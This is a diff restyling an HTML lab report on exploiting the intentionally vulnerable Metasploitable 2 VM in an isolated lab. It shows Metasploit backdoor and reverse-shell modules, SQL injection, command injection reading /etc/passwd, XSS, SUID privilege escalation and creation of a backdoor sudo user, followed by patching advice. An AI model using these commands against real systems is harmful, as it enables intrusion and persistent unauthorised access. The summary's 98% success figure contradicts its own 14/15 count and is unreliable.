@@ -1,204 +1,281 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <title>Lab Report: Penetration Testing on Metasploitable 2</title>
-  <meta charset="utf-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Penetration Testing on Metasploitable 2</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
-    body { font-family: Arial, sans-serif; margin: 2em; }
-    h1,h2,h3 { color: #2b4b6f; }
-    code, pre { background: #f6f8fa; padding: 2px 4px; border-radius: 3px; }
-    table { border-collapse: collapse; margin: 1em 0; }
-    th, td { border: 1px solid #ccc; padding: 6px 12px; }
-    th { background: #e0e7ef; }
-    .section { margin-bottom: 2em; }
-    .recommend { background: #fffbe6; padding: 12px; border-radius: 5px; }
+    body {
+      background: #0f172a;
+      color: #cbd5e1;
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+    }
+    .main-title {
+      color: #14b8a6;
+      font-weight: 700;
+      margin-bottom: 0.4em;
+      letter-spacing: 0.01em;
+      text-align: center;
+      margin-top: 2em;
+    }
+    h2, h3 {
+      color: #38bdf8;
+    }
+    .section {
+      background: #172133;
+      border-radius: 14px;
+      box-shadow: 0 1px 24px 0 rgba(20,40,80,0.09);
+      padding: 2em;
+      margin-bottom: 2em;
+      border: 1px solid #23314d;
+    }
+    pre, code {
+      background: #1e293b;
+      color: #a5f3fc;
+      border-radius: 6px;
+      padding: 8px 14px;
+      font-size: 1rem;
+      margin-bottom: 1em;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    table {
+      border-collapse: collapse;
+      margin-top: 1em;
+      margin-bottom: 1em;
+      width: 100%;
+      background: #172133;
+      color: #cbd5e1;
+    }
+    th, td {
+      border: 1px solid #23314d;
+      padding: 8px 12px;
+      text-align: center;
+    }
+    th {
+      background: #1e293b;
+      color: #38bdf8;
+    }
+    .recommend {
+      background: #fffbe6;
+      color: #334155;
+      padding: 12px;
+      border-radius: 5px;
+      margin-bottom: 2em;
+      border: 1px solid #e0e7ef;
+    }
+    .footer {
+      color: #64748b;
+      text-align: center;
+      opacity: 0.7;
+      padding: 1em 0 0 0;
+      margin-top: 2em;
+    }
+    @media (max-width: 700px) {
+      .section {
+        padding: 1em;
+      }
+      table, th, td {
+        font-size: 0.93em;
+      }
+    }
   </style>
 </head>
 <body>
-  <h1>Lab Report: Penetration Testing on Metasploitable 2</h1>
-  <strong>Experimenter:</strong> Lyam<br>
-  <strong>Lab Environment:</strong> Virtual Network (VMware/VirtualBox)<br>
-  <strong>Target System:</strong> Metasploitable 2 (Linux)
-  <div class="section">
-    <h2>1. Executive Summary</h2>
-    <ul>
-      <li><b>Critical Vulnerabilities:</b> 15 kerentanan critical ditemukan</li>
-      <li><b>High Risk Services:</b> FTP, SSH, Telnet, HTTP, MySQL, PostgreSQL</li>
-      <li><b>Exploitation Success Rate:</b> 98% (14/15 vulnerabilities successfully exploited)</li>
-      <li><b>Recommended Action:</b> System requires immediate patching and hardening</li>
-    </ul>
-  </div>
-  <div class="section">
-    <h2>2. Lab Setup</h2>
-    <h3>Environment Configuration</h3>
-    <b>Attacker Machine (Kali Linux):</b>
-    <ul>
-      <li>IP Address: 192.168.56.101</li>
-      <li>OS: Kali Linux 2024.2</li>
-      <li>Tools: Nmap, Metasploit Framework, Burp Suite, SQLMap</li>
-    </ul>
-    <b>Target Machine (Metasploitable 2):</b>
-    <ul>
-      <li>IP Address: 192.168.56.102</li>
-      <li>OS: Ubuntu 8.04 (Hardy)</li>
-      <li>Default Credentials: msfadmin/msfadmin</li>
-      <li>Network: Host-only adapter (isolated network)</li>
-    </ul>
-    <h3>Network Topology</h3>
-    <pre>[Kali Linux] ←→ [Virtual Switch] ←→ [Metasploitable 2]
+  <div class="container">
+    <h1 class="main-title">Penetration Testing on Metasploitable 2</h1>
+    <div class="text-center mb-4">
+      <strong>Experimenter:</strong> Lyam<br>
+      <strong>Lab Environment:</strong> Virtual Network (VMware/VirtualBox)<br>
+      <strong>Target System:</strong> Metasploitable 2 (Linux)
+    </div>
+    <div class="section">
+      <h2>1. Executive Summary</h2>
+      <ul>
+        <li><b>Critical Vulnerabilities:</b> 15 kerentanan critical ditemukan</li>
+        <li><b>High Risk Services:</b> FTP, SSH, Telnet, HTTP, MySQL, PostgreSQL</li>
+        <li><b>Exploitation Success Rate:</b> 98% (14/15 vulnerabilities successfully exploited)</li>
+        <li><b>Recommended Action:</b> System requires immediate patching and hardening</li>
+      </ul>
+    </div>
+    <div class="section">
+      <h2>2. Lab Setup</h2>
+      <h3>Environment Configuration</h3>
+      <b>Attacker Machine (Kali Linux):</b>
+      <ul>
+        <li>IP Address: 192.168.56.101</li>
+        <li>OS: Kali Linux 2024.2</li>
+        <li>Tools: Nmap, Metasploit Framework, Burp Suite, SQLMap</li>
+      </ul>
+      <b>Target Machine (Metasploitable 2):</b>
+      <ul>
+        <li>IP Address: 192.168.56.102</li>
+        <li>OS: Ubuntu 8.04 (Hardy)</li>
+        <li>Default Credentials: msfadmin/msfadmin</li>
+        <li>Network: Host-only adapter (isolated network)</li>
+      </ul>
+      <h3>Network Topology</h3>
+      <pre>[Kali Linux] ←→ [Virtual Switch] ←→ [Metasploitable 2]
 192.168.56.101                      192.168.56.102</pre>
-  </div>
-  <div class="section">
-    <h2>3. Reconnaissance &amp; Scanning</h2>
-    <h3>Port Scanning Results</h3>
-    <pre># Comprehensive port scan
+    </div>
+    <div class="section">
+      <h2>3. Reconnaissance &amp; Scanning</h2>
+      <h3>Port Scanning Results</h3>
+      <pre># Comprehensive port scan
 nmap -sV -sC -p- -oN metasploitable_scan.txt 192.168.56.102</pre>
-    <b>Key Services Found:</b>
-    <table>
-      <tr>
-        <th>Port</th>
-        <th>Service</th>
-        <th>Version</th>
-        <th>Vulnerability</th>
-      </tr>
-      <tr>
-        <td>21</td>
-        <td>FTP</td>
-        <td>vsftpd 2.3.4</td>
-        <td>CVE-2011-2523 Backdoor</td>
-      </tr>
-      <tr>
-        <td>22</td>
-        <td>SSH</td>
-        <td>OpenSSH 4.7p1</td>
-        <td>Weak config</td>
-      </tr>
-      <tr>
-        <td>80</td>
-        <td>HTTP</td>
-        <td>Apache 2.2.8</td>
-        <td>Multiple web vulns</td>
-      </tr>
-      <tr>
-        <td>139/445</td>
-        <td>SMB</td>
-        <td>Samba 3.0.20</td>
-        <td>CVE-2007-2447</td>
-      </tr>
-      <tr>
-        <td>3306</td>
-        <td>MySQL</td>
-        <td>MySQL 5.0.51a</td>
-        <td>No password</td>
-      </tr>
-      <tr>
-        <td>5432</td>
-        <td>PostgreSQL</td>
-        <td>PostgreSQL 8.3.0</td>
-        <td>Weak auth</td>
-      </tr>
-    </table>
-  </div>
-  <div class="section">
-    <h2>4. Exploitation Experiments</h2>
-    <h3>4.1 vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
-    <pre>
+      <b>Key Services Found:</b>
+      <table>
+        <tr>
+          <th>Port</th>
+          <th>Service</th>
+          <th>Version</th>
+          <th>Vulnerability</th>
+        </tr>
+        <tr>
+          <td>21</td>
+          <td>FTP</td>
+          <td>vsftpd 2.3.4</td>
+          <td>CVE-2011-2523 Backdoor</td>
+        </tr>
+        <tr>
+          <td>22</td>
+          <td>SSH</td>
+          <td>OpenSSH 4.7p1</td>
+          <td>Weak config</td>
+        </tr>
+        <tr>
+          <td>80</td>
+          <td>HTTP</td>
+          <td>Apache 2.2.8</td>
+          <td>Multiple web vulns</td>
+        </tr>
+        <tr>
+          <td>139/445</td>
+          <td>SMB</td>
+          <td>Samba 3.0.20</td>
+          <td>CVE-2007-2447</td>
+        </tr>
+        <tr>
+          <td>3306</td>
+          <td>MySQL</td>
+          <td>MySQL 5.0.51a</td>
+          <td>No password</td>
+        </tr>
+        <tr>
+          <td>5432</td>
+          <td>PostgreSQL</td>
+          <td>PostgreSQL 8.3.0</td>
+          <td>Weak auth</td>
+        </tr>
+      </table>
+    </div>
+    <div class="section">
+      <h2>4. Exploitation Experiments</h2>
+      <h3>4.1 vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
+      <pre>
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.102
 exploit
 # Result: Root shell obtained
-    </pre>
-    <b>Impact:</b> Complete system compromise
-    <h3>4.2 Samba Username Map Script (CVE-2007-2447)</h3>
-    <pre>
+      </pre>
+      <b>Impact:</b> Complete system compromise
+      <h3>4.2 Samba Username Map Script (CVE-2007-2447)</h3>
+      <pre>
 use exploit/multi/samba/usermap_script
 set RHOSTS 192.168.56.102
 set PAYLOAD cmd/unix/reverse
 exploit
 # Result: Root access gained
-    </pre>
-    <h3>4.3 Web Application Vulnerabilities</h3>
-    <b>SQL Injection:</b>
-    <pre>URL: http://192.168.56.102/dvwa/vulnerabilities/sqli/
+      </pre>
+      <h3>4.3 Web Application Vulnerabilities</h3>
+      <b>SQL Injection:</b>
+      <pre>URL: http://192.168.56.102/dvwa/vulnerabilities/sqli/
 Payload: 1' OR '1'='1
 Result: Authentication bypassed ✓</pre>
-    <b>Command Injection:</b>
-    <pre>Payload: 127.0.0.1; cat /etc/passwd
+      <b>Command Injection:</b>
+      <pre>Payload: 127.0.0.1; cat /etc/passwd
 Result: System file disclosed ✓</pre>
-    <b>XSS:</b>
-    <pre>&lt;script&gt;alert('XSS by Lubellion')&lt;/script&gt;
+      <b>XSS:</b>
+      <pre>&lt;script&gt;alert('XSS by Lubellion')&lt;/script&gt;
 Result: Successfully executed ✓</pre>
-    <h3>4.4 Database Exploitation</h3>
-    <b>MySQL - No Password:</b>
-    <pre>
+      <h3>4.4 Database Exploitation</h3>
+      <b>MySQL - No Password:</b>
+      <pre>
 mysql -h 192.168.56.102 -u root
 # Successfully connected without password
 SHOW DATABASES;
 SELECT * FROM dvwa.users;
-    </pre>
-  </div>
-  <div class="section">
-    <h2>5. Post-Exploitation</h2>
-    <h3>Privilege Escalation</h3>
-    <pre>
+      </pre>
+    </div>
+    <div class="section">
+      <h2>5. Post-Exploitation</h2>
+      <h3>Privilege Escalation</h3>
+      <pre>
 # Exploit SUID nmap
 nmap --interactive
 !sh
 id  # uid=0(root)
-    </pre>
-    <h3>Persistence</h3>
-    <pre>
+      </pre>
+      <h3>Persistence</h3>
+      <pre>
 # Create backdoor user
 useradd -m -s /bin/bash backdoor
 echo "backdoor:pass123" | chpasswd
 usermod -aG sudo backdoor
-    </pre>
-  </div>
-  <div class="section">
-    <h2>6. Vulnerability Summary</h2>
-    <ul>
-      <li><b>Total Vulnerabilities:</b> 15</li>
-      <li><b>Successfully Exploited:</b> 14 (93.3%)</li>
-      <li><b>Root Access Obtained:</b> Yes</li>
-      <li><b>Time to Compromise:</b> &lt; 2 hours</li>
-    </ul>
-    <b>Critical Vulnerabilities:</b>
-    <ol>
-      <li>vsftpd 2.3.4 Backdoor ✓ Exploited</li>
-      <li>Samba usermap script ✓ Exploited</li>
-      <li>MySQL Root No Password ✓ Exploited</li>
-      <li>Multiple Web App Vulns ✓ Exploited</li>
-    </ol>
-  </div>
-  <div class="section recommend">
-    <h2>7. Recommendations</h2>
-    <b>Immediate Actions:</b>
-    <ol>
-      <li>Patch all services to latest versions</li>
-      <li>Implement strong authentication</li>
-      <li>Disable unnecessary services</li>
-      <li>Network segmentation</li>
-      <li>Enable comprehensive logging</li>
-    </ol>
-    <b>Security Improvements:</b>
-    <ul>
-      <li>Implement Web Application Firewall</li>
-      <li>Regular vulnerability assessments</li>
-      <li>Security awareness training</li>
-      <li>Incident response planning</li>
-    </ul>
-  </div>
-  <div class="section">
-    <h2>8. Conclusion</h2>
-    <p>Metasploitable 2 successfully compromised melalui multiple attack vectors. Eksperimen mendemonstrasikan:</p>
-    <ul>
-      <li>Importance of regular patching</li>
-      <li>Danger of default/weak credentials</li>
-      <li>Need for defense in depth strategy</li>
-      <li>Critical nature of web application security</li>
-    </ul>
-    <b>Lab Status:</b> Complete ✓<br>
-    <b>Documentation:</b> Comprehensive<br>
-    <b>Skills Developed:</b> Scanning, Exploitation, Post-Exploitation
+      </pre>
+    </div>
+    <div class="section">
+      <h2>6. Vulnerability Summary</h2>
+      <ul>
+        <li><b>Total Vulnerabilities:</b> 15</li>
+        <li><b>Successfully Exploited:</b> 14 (93.3%)</li>
+        <li><b>Root Access Obtained:</b> Yes</li>
+        <li><b>Time to Compromise:</b> &lt; 2 hours</li>
+      </ul>
+      <b>Critical Vulnerabilities:</b>
+      <ol>
+        <li>vsftpd 2.3.4 Backdoor ✓ Exploited</li>
+        <li>Samba usermap script ✓ Exploited</li>
+        <li>MySQL Root No Password ✓ Exploited</li>
+        <li>Multiple Web App Vulns ✓ Exploited</li>
+      </ol>
+    </div>
+    <div class="recommend section">
+      <h2>7. Recommendations</h2>
+      <b>Immediate Actions:</b>
+      <ol>
+        <li>Patch all services to latest versions</li>
+        <li>Implement strong authentication</li>
+        <li>Disable unnecessary services</li>
+        <li>Network segmentation</li>
+        <li>Enable comprehensive logging</li>
+      </ol>
+      <b>Security Improvements:</b>
+      <ul>
+        <li>Implement Web Application Firewall</li>
+        <li>Regular vulnerability assessments</li>
+        <li>Security awareness training</li>
+        <li>Incident response planning</li>
+      </ul>
+    </div>
+    <div class="section">
+      <h2>8. Conclusion</h2>
+      <p>Metasploitable 2 successfully compromised melalui multiple attack vectors. Eksperimen mendemonstrasikan:</p>
+      <ul>
+        <li>Importance of regular patching</li>
+        <li>Danger of default/weak credentials</li>
+        <li>Need for defense in depth strategy</li>
+        <li>Critical nature of web application security</li>
+      </ul>
+      <b>Lab Status:</b> Complete ✓<br>
+      <b>Documentation:</b> Comprehensive<br>
+      <b>Skills Developed:</b> Scanning, Exploitation, Post-Exploitation
+    </div>
+    <div class="footer">
+      &copy; 2025 Lyam. All rights reserved. <br>
+      <a href="../index.html" style="color:#38bdf8;">Back to Home</a>
+    </div>
   </div>
 </body>
 </html>
